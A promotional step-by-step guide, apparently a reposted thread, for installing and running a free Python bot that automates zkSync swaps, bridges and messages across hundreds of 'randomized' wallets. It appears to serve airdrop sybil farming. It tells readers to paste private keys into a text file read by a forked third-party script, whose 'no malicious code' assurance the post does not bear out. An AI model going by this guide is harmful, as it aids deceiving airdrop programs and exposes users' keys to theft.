CT has been full of shit lately.

I'm sure you've missed the REAL ALPHA and I'm giving it to you.

Introducing: FREE SCRIPT for zkSync that lets you create HUNDREDS of RANDOMIZED and UNIQUE wallets.

Yes, you heard me 👇



![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/84df9626-28fd-4045-b1fa-7e1e060e9995)



The script includes a wide range of customization options and protocols, from official bridge to landings, swaps, and sending messages via Dmail.

In short, it contains everything you need to create hundreds of unique and randomized zkSync wallets.
❗️ NOTE: the script has been tested and does not contain any malicious code, but it's always a good idea to DYOR as there may still be some risks involved ❗️
The instructions provided below are specifically for Windows users.

However, you can easily figure out how to run the script on a Mac on your own.

Step 1: Download Python.

➬ Head to https://python.org/downloads/release/python-3100/

➬ Scroll down and click on the download link

Step 2: Install Python 3.10.

➬ Make sure to select "Add Python 3.10 to PATH"
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/67552986-b025-4203-837e-2cccb858e919)



Step 3: Next, to ensure the script works correctly, you will need Microsoft C++.

➬ Go to https://visualstudio.microsoft.com/visual-cpp-build-tools/ and download Microsoft C++ Build Tools.
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/1dbc3b09-843a-44f4-adf4-d4c38f76cb58)


Step 4: Install Visual Studio.

➬ During the installation process, select "Desktop development with C++".
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/26238f93-e60d-42da-9147-e161407668e7)
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/7298bd21-bba0-40e2-8bd6-6e115eeb1ebe)



Step 5: Go to https://github.com/Ardizor/zksync and download the Python script for zkSync.

➬ I forked the script to keep you safe from possible malicious updates, but if you want, you can go to the author at your own risk.

Step 6: Unzip it to a convenient location of your choice.

➬ For example, you can create a separate folder for scripts on your desktop.



Step 7: To configure the settings, follow these steps:

➬ Open the "modules_settings" file in a text editor.

➬ Configure the parameters for each module.
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/16076d6a-b10f-4f13-acbc-66beae2cee0f)



Let's go through the example of Syncswap using the screenshot below.

➬ If you set it up like mine, we'll make a USDC-ETH swap on Syncswap with an amount ranging from 10 to 20 USDC.

➬ Save your "config" file.
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/aaf2c44d-31df-448c-8147-ea5153be7742)



Step 8: Open the "settings" file in a text editor.

Here, we configure the interval between script actions, randomization of wallets, etc.

➬ I recommend a minimum 120-second interval.

➬ Get the 1inch API key here: https://portal.1inch.dev/login

➬ Save your "settings" file.
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/df43f7e6-1cc2-47ad-90f9-770ba9594126)
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/2f154e6a-20be-470f-999f-778f568381c8)

You can also use a proxy for each wallet, but in this case, I don't think it's necessary.




Step 9: Open the "accounts" file in a text editor.

➬ Paste private keys from the wallets you want to work with.

➬ 1 line - 1 key.

❗️ NOTE: make sure you run the script on a secure device and no one has access to your private keys ❗️

➬ Save "accounts" file.
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/f9402597-6405-4d94-ba04-d3cdcc6b6a25)
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/fd0a632c-2b76-4045-928f-4cd19ef73967)




Step 10: Open cmd on your device.

Enter the commands in turn:

➬ cd C\:users\ardizor\desktop\soft\zksync
(replace this with your path to the script folder)

➬ pip3 install -r requirements.txt
(requirements command is only needed when running the script for the first time)
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/67bc0d98-7ac4-44ee-84e3-f9d56f9239bc)
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/a6f535f1-e12c-4a11-988c-21f7299a7a85)


➬ python main.py

X thinks http://main.py is a link and copies it with "https", you should type the command without "https".
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/d3da93a3-7156-4701-a6fc-ee0220f47f85)


Step 11: Select the desired module using the arrows on the keyboard and press "enter".
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/f73163a0-8d96-4760-9117-097b83668b76)



If you've done everything correctly, you'll see the swapping process.

Step 12: Wait for the script to finish and close cmd.
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/d4e25522-26d8-435e-95fb-af697122dad3)




Step 13: Go to DeBank and check the transactions menu.

✔️ Congrats, little coder! The script successfully executed your selected actions.
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/d433a3e0-a9d8-4ffd-b333-05e969a89641)




Similar to Syncswap you can set up any other modules and run them, creating many unique and randomized wallets.





You can also configure custom and fully randomized routes.

To do this, simply scroll down of the "modules_settings" file and adjust the settings for the desired module.
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/c8367248-8f80-46c6-a6db-7c3f46e11a80)


Then, after running the script, select "Use custom routes".
![image](https://github.com/NunoyHaxxana/BOT-AIRDROP/assets/83507970/8adf5d97-97c2-449d-a32e-e0395e0d4271)



